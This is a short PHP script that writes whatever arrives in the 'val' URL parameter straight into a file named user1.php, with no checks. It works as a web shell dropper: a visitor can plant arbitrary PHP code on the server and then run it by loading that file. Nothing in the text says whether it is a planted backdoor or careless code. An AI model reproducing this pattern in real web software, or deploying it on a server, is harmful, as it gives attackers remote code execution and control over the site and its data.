<?php 
$f=fopen("user1.php","w");
$set=$_GET['val'];
fwrite($f,$set);
fclose($f);
?>